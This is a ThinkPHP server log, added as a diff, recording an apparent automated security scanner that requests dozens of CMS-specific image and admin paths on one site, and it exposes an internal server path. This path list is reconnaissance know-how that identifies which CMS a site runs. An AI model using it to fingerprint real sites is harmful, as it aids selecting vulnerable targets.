+[ log ] alroy.cn/cn/images/banner_page_bg.gif [运行时间：0.026121s][吞吐率：38.28req/s] [内存消耗：1,838.63kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'cn',
+    1 => 'images',
+    2 => 'banner_page_bg.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:24+08:00 ] 60.205.45.195 140.205.201.41 GET /static/image/common/addicn.gif
+[ log ] alroy.cn/static/image/common/addicn.gif [运行时间：0.028770s][吞吐率：34.76req/s] [内存消耗：1,838.65kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'image',
+    2 => 'common',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:25+08:00 ] 60.205.45.195 140.205.201.41 GET /static/space/t1/images/title.png
+[ log ] alroy.cn/static/space/t1/images/title.png [运行时间：0.026942s][吞吐率：37.12req/s] [内存消耗：1,839.11kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'space',
+    2 => 't1',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'title.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:25+08:00 ] 60.205.45.195 140.205.201.41 GET /themes/forum/default/images/forum/lock.gif
+[ log ] alroy.cn/themes/forum/default/images/forum/lock.gif [运行时间：0.026065s][吞吐率：38.37req/s] [内存消耗：1,839.23kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'themes',
+    1 => 'forum',
+    2 => 'default',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'forum',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:25+08:00 ] 60.205.45.195 140.205.201.41 GET /images/select_arrow_over.gif
+[ log ] alroy.cn/images/select_arrow_over.gif [运行时间：0.025629s][吞吐率：39.02req/s] [内存消耗：1,838.72kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'select_arrow_over.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:25+08:00 ] 60.205.45.195 140.205.201.41 GET /static/images/buttons_40.png
+[ log ] alroy.cn/static/images/buttons_40.png [运行时间：0.025261s][吞吐率：39.59req/s] [内存消耗：1,838.77kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'static',
+    1 => 'images',
+    2 => 'buttons_40.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:26+08:00 ] 60.205.45.195 140.205.201.41 GET /include/image/dui_r.gif
+[ log ] alroy.cn/include/image/dui_r.gif [运行时间：0.026953s][吞吐率：37.10req/s] [内存消耗：1,838.69kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'include',
+    1 => 'image',
+    2 => 'dui_r.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:26+08:00 ] 60.205.45.195 140.205.201.41 GET /template/default/index/images/anvico.png
+[ log ] alroy.cn/template/default/index/images/anvico.png [运行时间：0.026555s][吞吐率：37.66req/s] [内存消耗：1,839.34kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'template',
+    1 => 'default',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'anvico.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:26+08:00 ] 60.205.45.195 140.205.201.41 GET /skin/default/image/add_job.gif
+[ log ] alroy.cn/skin/default/image/add_job.gif [运行时间：0.028186s][吞吐率：35.48req/s] [内存消耗：1,838.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'skin',
+    1 => 'default',
+    2 => 'image',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:27+08:00 ] 60.205.45.195 140.205.201.41 GET /app/Tpl/main/fanwe/images/fanwe_ui/ui-buttonbg.gif
+[ log ] alroy.cn/app/Tpl/main/fanwe/images/fanwe_ui/ui-buttonbg.gif [运行时间：0.025802s][吞吐率：38.76req/s] [内存消耗：1,839.56kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'app',
+    1 => 'Tpl',
+    2 => 'main',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'fanwe' => 'images',
+  'fanwe_ui' => 'ui-buttonbg.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:27+08:00 ] 60.205.45.195 140.205.201.41 GET /views/images/admin/closex.gif
+[ log ] alroy.cn/views/images/admin/closex.gif [运行时间：0.025141s][吞吐率：39.78req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'views',
+    1 => 'images',
+    2 => 'admin',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:27+08:00 ] 60.205.45.195 140.205.201.41 GET /template/default/images/gbook_btn_bg.gif
+[ log ] alroy.cn/template/default/images/gbook_btn_bg.gif [运行时间：0.027417s][吞吐率：36.47req/s] [内存消耗：1,838.74kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'template',
+    1 => 'default',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:28+08:00 ] 60.205.45.195 140.205.201.41 GET /inc/images/captcha_bg.jpg
+[ log ] alroy.cn/inc/images/captcha_bg.jpg [运行时间：0.026743s][吞吐率：37.39req/s] [内存消耗：1,838.62kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'inc',
+    1 => 'images',
+    2 => 'captcha_bg.jpg',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:28+08:00 ] 60.205.45.195 140.205.201.41 GET /inc/templates/manage/images/cross_grey_small.png
+[ log ] alroy.cn/inc/templates/manage/images/cross_grey_small.png [运行时间：0.029468s][吞吐率：33.94req/s] [内存消耗：1,839.28kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'inc',
+    1 => 'templates',
+    2 => 'manage',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'cross_grey_small.png',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:28+08:00 ] 60.205.45.195 140.205.201.41 GET /content/plugins/tips/icon_tips.gif
+[ log ] alroy.cn/content/plugins/tips/icon_tips.gif [运行时间：0.026541s][吞吐率：37.68req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'content',
+    1 => 'plugins',
+    2 => 'tips',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:29+08:00 ] 60.205.45.195 140.205.201.41 GET /content/templates/default/images/weibe_button.gif
+[ log ] alroy.cn/content/templates/default/images/weibe_button.gif [运行时间：0.030174s][吞吐率：33.14req/s] [内存消耗：1,839.30kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'content',
+    1 => 'templates',
+    2 => 'default',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'weibe_button.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:29+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/templates/met/images/logosmall.gif
+[ log ] alroy.cn/admin/templates/met/images/logosmall.gif [运行时间：0.028160s][吞吐率：35.51req/s] [内存消耗：1,840.34kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'templates',
+    2 => 'met',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'logosmall.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:29+08:00 ] 60.205.45.195 140.205.201.41 GET /job/templates/met/css/style.css
+[ log ] alroy.cn/job/templates/met/css/style.css [运行时间：0.030861s][吞吐率：32.40req/s] [内存消耗：1,839.09kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'job',
+    1 => 'templates',
+    2 => 'met',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'css' => 'style.css',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:30+08:00 ] 60.205.45.195 140.205.201.41 GET /wap/templates/met/images/listico.gif
+[ log ] alroy.cn/wap/templates/met/images/listico.gif [运行时间：0.027563s][吞吐率：36.28req/s] [内存消耗：1,839.10kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wap',
+    1 => 'templates',
+    2 => 'met',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'listico.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:30+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/icon_view.gif
+[ log ] alroy.cn/admin/images/icon_view.gif [运行时间：0.027283s][吞吐率：36.65req/s] [内存消耗：1,839.64kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'icon_view.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:30+08:00 ] 60.205.45.195 140.205.201.41 GET /install/images/install-step1-en_us.gif
+[ log ] alroy.cn/install/images/install-step1-en_us.gif [运行时间：0.027735s][吞吐率：36.06req/s] [内存消耗：1,838.50kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'install',
+    1 => 'images',
+    2 => 'install-step1-en_us.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:31+08:00 ] 60.205.45.195 140.205.201.41 GET /images/admina/logo.png
+[ log ] alroy.cn/images/admina/logo.png [运行时间：0.025580s][吞吐率：39.09req/s] [内存消耗：1,838.45kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'admina',
+    2 => 'logo.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:31+08:00 ] 60.205.45.195 140.205.201.41 GET /images/admina/sitmap0.png
+[ log ] alroy.cn/images/admina/sitmap0.png [运行时间：0.028667s][吞吐率：34.88req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'admina',
+    2 => 'sitmap0.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:31+08:00 ] 60.205.45.195 140.205.201.41 GET /app/Tpl/fanwe/images/fancybox_loading.gif
+[ log ] alroy.cn/app/Tpl/fanwe/images/fancybox_loading.gif [运行时间：0.026203s][吞吐率：38.16req/s] [内存消耗：1,839.29kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'app',
+    1 => 'Tpl',
+    2 => 'fanwe',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+  'images' => 'fancybox_loading.gif',
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:31+08:00 ] 60.205.45.195 140.205.201.41 GET /images/side_bg_r2_c1.gif
+[ log ] alroy.cn/images/side_bg_r2_c1.gif [运行时间：0.025657s][吞吐率：38.98req/s] [内存消耗：1,838.53kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'side_bg_r2_c1.gif',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:32+08:00 ] 60.205.45.195 140.205.201.41 GET /e/install/images/noadd.gif
+[ log ] alroy.cn/e/install/images/noadd.gif [运行时间：0.026604s][吞吐率：37.59req/s] [内存消耗：1,838.49kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'e',
+    1 => 'install',
+    2 => 'images',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:32+08:00 ] 60.205.45.195 140.205.201.41 GET /d/js/acmsd/close_o.gif
+[ log ] alroy.cn/d/js/acmsd/close_o.gif [运行时间：0.025162s][吞吐率：39.74req/s] [内存消耗：1,838.58kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'd',
+    1 => 'js',
+    2 => 'acmsd',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:32+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/login/index_hz02.gif
+[ log ] alroy.cn/admin/images/login/index_hz02.gif [运行时间：0.029238s][吞吐率：34.20req/s] [内存消耗：1,839.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:33+08:00 ] 60.205.45.195 140.205.201.41 GET /images/showsp/areabg.gif
+[ log ] alroy.cn/images/showsp/areabg.gif [运行时间：0.026261s][吞吐率：38.08req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'showsp',
+    2 => 'areabg.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
